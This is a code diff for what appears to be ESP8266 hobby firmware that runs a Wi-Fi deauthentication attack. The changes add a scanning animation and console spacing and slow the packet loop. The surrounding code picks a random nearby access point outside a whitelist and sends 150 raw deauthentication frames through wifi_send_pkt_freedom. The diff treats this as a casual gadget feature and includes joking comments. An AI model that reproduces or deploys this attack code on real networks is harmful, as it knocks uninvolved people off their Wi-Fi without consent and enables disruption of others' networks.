@@ -46,6 +46,18 @@ void Deauth::list() {
 }
 
 void Deauth::select() {
+    // cool animation 
+    for (int i = 0; i < 5; ++i) {
+        Serial.println("(0-o) Scanning for APs.");
+        delay(500);
+        Serial.println("(o-0) Scanning for APs..");
+        delay(500);
+        Serial.println("(0-o) Scanning for APs...");
+        delay(500);
+    }
+
+    delay(5000);
+
     int apCount = WiFi.scanNetworks();
 
     if (apCount > 0) {
@@ -57,12 +69,15 @@ void Deauth::select() {
             Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
             return;
         }
-
+        Serial.println(" ");
         Serial.print("('-') Selected random AP: ");
         Serial.println(randomAP);
+        Serial.println(" ");
     } else {
         // well ur fucked.
+        Serial.println(" ");
         Serial.println("(;-;) No access points found.");
+        Serial.println(" ");
     }
 };
 
@@ -72,17 +87,23 @@ void Deauth::deauth() {
         Deauth::select();
     
         if (randomAP.length() > 0) {
+            Serial.println(" ");
             Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
+            Serial.println(" ");
             // define the attack
             if (!running) {
                 start();
             } else {
+                Serial.println(" ");
                 Serial.println("('-') Attack is already running.");
+                Serial.println(" ");
             }
         } else {
             // ok why did you modify the deauth function? i literally told you to not do that...
+            Serial.println(" ");
             Serial.println("(X-X) No access point selected. Use select() first.");
             Serial.println("('-') Told you so!");
+            Serial.println(" ");
         } 
     } else {
         // do nothing if deauthing is disabled
@@ -97,7 +118,7 @@ void Deauth::start() {
     for (int i = 0; i < 150; ++i) {
         wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthPacket), packetSize, 0);
         Serial.println("(>-<) Deauth packet sent!");
-        delay(100);
+        delay(500);
     }
     Serial.println("(^-^) Attack finished!");
     running = false;
